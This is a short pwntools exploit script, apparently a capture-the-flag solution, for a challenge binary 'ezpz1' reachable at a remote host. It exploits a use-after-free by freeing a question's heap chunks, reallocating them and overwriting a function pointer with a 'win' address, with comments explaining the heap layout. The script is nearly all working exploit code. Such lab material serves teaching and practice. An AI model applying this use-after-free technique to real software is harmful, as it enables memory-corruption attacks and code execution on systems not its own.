from pwn import *

PROG_NAME = "./ezpz1"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7001

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

def create(num):
    p.recvuntil("refresh): ")
    p.sendline("C")

def free(num):
    p.recvuntil("refresh): ")
    p.sendline("D")
    p.sendline(str(num))

def set(num, data):
    p.recvuntil("refresh): ")
    p.sendline("S")
    p.sendline(str(num))
    p.sendline(data)

def ask(num):
    p.recvuntil("refresh): ")
    p.sendline("A")
    p.sendline(str(num))

# win addr is 0x08048a5c

# each question entry has 2 malloc'ed chunks (size 0x20 each)
# first chunk starts with a function pointer (executed by ask) and ends with a pointer to the 2nd chunk (serving as a string pointer)
# second chunk stores string data which is intended to be printed by the function pointer

create(0)
free(0)

# the first chunk for a question is freed first, then the second string chunk
# this means in the bin, for first fit allocation, the second chunk will get malloc'ed first in future

create(1)

# so now question 0 uses chunk 1 and 2 respectively, and question 1 uses chunk 2 and 1 respectively

# by setting the string of q1, we write the win function address to the first chunk
# in relation to q0 this is overwriting the function pointer
set(1, p32(0x08048a5c))

# since theres a UAF vuln, we can still ask q0 although it was freed
# asking will trigger the function pointer which is now the win function
ask(0)

p.interactive()